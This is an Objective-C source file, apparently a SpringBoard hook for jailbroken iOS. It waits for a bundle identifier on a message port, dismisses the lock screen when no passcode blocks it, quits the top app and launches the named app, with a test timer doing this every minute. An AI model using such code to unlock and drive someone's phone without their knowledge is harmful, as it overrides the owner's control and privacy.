//
//  SBActivationWizardManager.m
//  MSFSP
//
//  Created by Makara Khloth on 6/11/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SBActivationWizardManager.h"

#import "DefStd.h"

#import "SBApplicationController.h"
#import "SBApplicationController+iOS8.h"
#import "SBApplication.h"
#import "SBUIController.h"
#import "SBAwayController.h"
#import "SBDeviceLockController.h"
#import "SpringBoard.h"

#import "SBUIController+iOS9.h"

#import <objc/runtime.h>

static SBActivationWizardManager *_SBActivationWizardManager = nil;

@interface SBActivationWizardManager (private)
- (void) sbFinishLaunching: (NSNotification *) aNotification;
- (void) launchApplicationWithIdentifier: (NSString *) aIdentifier;
@end


@implementation SBActivationWizardManager

@synthesize mSBFinishLaunching;

+ (id) sharedSBActivationWizardManager {
	if (_SBActivationWizardManager == nil) {
		_SBActivationWizardManager = [[SBActivationWizardManager alloc] init];
		
		NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
		[nc addObserver:_SBActivationWizardManager
			   selector:@selector(sbFinishLaunching:)
				   name:UIApplicationDidFinishLaunchingNotification
				 object:nil];
	}
	return (_SBActivationWizardManager);
}

- (id) init {
	if ((self = [super init])) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kActivationWizardMessagePort
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	return (self);
}

- (void) _test {
	NSString *mobileSafariIdentifier = @"com.apple.mobilesafari";
	[NSTimer scheduledTimerWithTimeInterval:60 
									 target:self
								   selector:@selector(dataDidReceivedFromMessagePort:)
								   userInfo:[mobileSafariIdentifier dataUsingEncoding:NSUTF8StringEncoding]
									repeats:YES];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"Activation Wizard..., aRawData = %@", aRawData);
	
	if (![self mSBFinishLaunching]) {
		if ([aRawData isKindOfClass:[NSData class]]) {
			DLog (@"SpringBoard not finish launching....");
			[self performSelector:@selector(dataDidReceivedFromMessagePort:) withObject:aRawData afterDelay:3.0];
		}
	} else {
		DLog (@"SpringBoard finish launching...");
		
		[self setMSBFinishLaunching:NO];
		
		SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
		
		SBAwayController *sharedAwayController = [objc_getClass("SBAwayController") sharedAwayController];
		
		Class $SBDeviceLockController = objc_getClass("SBDeviceLockController");
		SBDeviceLockController *sbDeviceLockController = [$SBDeviceLockController sharedController];
		
		BOOL isBlocked = NO;
		
		if ([sharedAwayController respondsToSelector:@selector(isBlocked)]) {
			DLog (@"[sharedAwayController isBlocked]");
			isBlocked = [sharedAwayController isBlocked];
		} else if ([sbDeviceLockController respondsToSelector:@selector(isBlocked)]) {
			DLog (@"[sbDeviceLockController isBlocked]");
			isBlocked = [sbDeviceLockController isBlocked];
		}
		
		DLog (@"Is device locked = %d", [sharedAwayController isLocked]);
		DLog (@"Is device blocked = %d", isBlocked);
		
		if (!isBlocked) {
			// -- unlock iphone's lock screen
			[sharedAwayController unlockWithSound:YES];
            
            if ([sb respondsToSelector:@selector(quitTopApplication:)]) {
                // Not available in iOS 8
                [sb quitTopApplication:nil];
            }
            
			NSString *bundleIdentifier = nil;
			
			// Because testing purpose we need to check it...
			if ([aRawData isKindOfClass:[NSData class]]) {
				bundleIdentifier = [[NSString alloc] initWithData:aRawData encoding:NSUTF8StringEncoding];
			} else if ([aRawData isKindOfClass:[NSTimer class]]) {
				NSTimer *timer = (NSTimer *)aRawData;
				NSData *rawData = [timer userInfo];
				bundleIdentifier = [[NSString alloc] initWithData:rawData encoding:NSUTF8StringEncoding];
			}
			
			[self performSelector:@selector(launchApplicationWithIdentifier:) withObject:bundleIdentifier afterDelay:3.0];
			
			[bundleIdentifier release];
		} else {
			DLog (@"Device is blocked with passcode, wizard failed...");
		}
	}
}

- (void) sbFinishLaunching: (NSNotification *) aNotification {
	DLog (@"SpringBoard finish launching ****");
	[self setMSBFinishLaunching:YES];
}

- (void) launchApplicationWithIdentifier: (NSString *) aBundleIdentifier {
	DLog (@"aBundleIdentifier = %@", aBundleIdentifier);
	Class $SBApplicationController = objc_getClass("SBApplicationController");
    SBApplicationController *sbAppController = [$SBApplicationController sharedInstance];
	SBApplication *sbApplication = nil;
    if ([sbAppController respondsToSelector:@selector(applicationWithDisplayIdentifier:)]) {
        // Below iOS 8
        sbApplication = [sbAppController applicationWithDisplayIdentifier:aBundleIdentifier];
    } else {
        // iOS 8,9
        sbApplication = [sbAppController applicationWithBundleIdentifier:aBundleIdentifier];
    }
    
	Class $SBUIController = objc_getClass("SBUIController");
    SBUIController *sbUIController = [$SBUIController sharedInstance];
    if ([sbUIController respondsToSelector:@selector(activateApplicationAnimated:)]) { // Below iOS 9
        [sbUIController activateApplicationAnimated:sbApplication];
    } else if ([sbUIController respondsToSelector:@selector(activateApplication:)]) { // iOS 9
        [sbUIController activateApplication:sbApplication];
    }
	
	DLog (@"sbApplication = %@", sbApplication);
	DLog (@"[$SBApplicationController sharedInstance] = %@", [$SBApplicationController sharedInstance]);
	DLog (@"[$SBUIController sharedInstance] = %@", [$SBUIController sharedInstance]);
}

- (id)retain {
	return self;
}

- (NSUInteger)retainCount {
	return NSUIntegerMax;  //denotes an object that cannot be released
}

- (void)release {
	//do nothing
}

- (id)autorelease {
	return self;
}

- (void) dealloc {
	_SBActivationWizardManager = nil;
	[super dealloc];
}

@end
